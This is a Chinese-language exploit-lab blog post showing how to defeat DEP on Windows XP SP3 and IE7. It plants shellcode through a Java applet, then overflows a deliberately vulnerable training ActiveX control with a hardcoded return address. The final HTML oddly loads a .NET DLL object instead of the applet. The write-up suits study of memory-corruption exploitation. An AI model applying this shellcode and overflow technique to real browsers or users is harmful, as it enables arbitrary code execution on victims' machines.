---
layout:		post
title:		利用Java applet挑战DEP
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008 
>调试器: OllyDbg 1.10  
>浏览器: Internet Explorer 7  
>JRE版本: 1.4.2_06
<!-- more -->


### 0x00 前期准备

新建一个Java applet

```
//Shellcode.java
import java.applet.*;
import java.awt.*;

public class Shellcode extends Applet{
    public void init(){
        Runtime.getRuntime().gc();
        StringBuffer buffer=new StringBuffer(255);

        buffer.append("\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
            "\ud231\u30b2\u8b64\u8b12\u0c52\u528b\u8b1c\u0842" +
            "\u728b\u8b20\u8012\u0c7e\u7533\u89f2\u03c7\u3c78" +
            "\u578b\u0178\u8bc2\u207a\uc701\ued31\u348b\u01af" +
            "\u45c6\u3e81\u6146\u6174\uf275\u7e81\u4508\u6978" +
            "\u7574\u8be9\u247a\uc701\u8b66\u6f2c\u7a8b\u011c" +
            "\u8bc7\uaf7c\u01fc\u68c7\u2067\u0120\u7968\u7530" +
            "\u686e\u7720\u6f6f\ue189\u49fe\u310b\u51c0\uff50" +
            "\u90d7");
    }
}
```

编译生成*.class文件

```
> javac path/to/*.java -target 1.1
```

新建文本文件, 贴入以下代码, 更名为test.html

```
<html>
<body>
<applet code=Shellcode.class width=300 height=50></applet>
<script>alert("开始溢出!");</script>
<object classid="clsid:06BC9528-F8A0-456B-BBBB-09C1248BF827" id="test"></object>  
<script>  
var s = "\u9090";
while (s.length < 54) {
s += "\u9090";
}
s+="\u9090\u9090";
test.test(s);  
</script>  
</body>  
</html>
```

将VulnerAX_DEP.ocx和以上两个文件一起放到wwwroot目录, 注册*.ocx文件


### 0x01 exploit

打开IE7.0, 访问http://127.0.0.1/test.html, 再双击打开test.html文件

![](/assets/img/exploit/2017-12-26-disable-dep-java-applet/0x00.png)

来到这里OD附加上去, 选择"E"打开模块, ocx成功加载

![](/assets/img/exploit/2017-12-26-disable-dep-java-applet/0x01.png)

检索shellcode的开始几个字节, 定位到0x1454D9FC

![](/assets/img/exploit/2017-12-26-disable-dep-java-applet/0x02.png)

修改test.html

```
<html>
<body>
<object classID="DEP_NETDLL.dll#DEP_NETDLL.Class1"></object>
<object classid="clsid:06BC9528-F8A0-456B-BBBB-09C1248BF827" id="test"></object>
<script>
var s="\u9090";
while(s.length<54){
	s+="\u9090";
}
s+="\uD9FC\u1454";
test.test(s);
</script>
</body>
</html>
```

关闭调试, 直接运行, pwn~

![](/assets/img/exploit/2017-12-26-disable-dep-java-applet/0x03.png)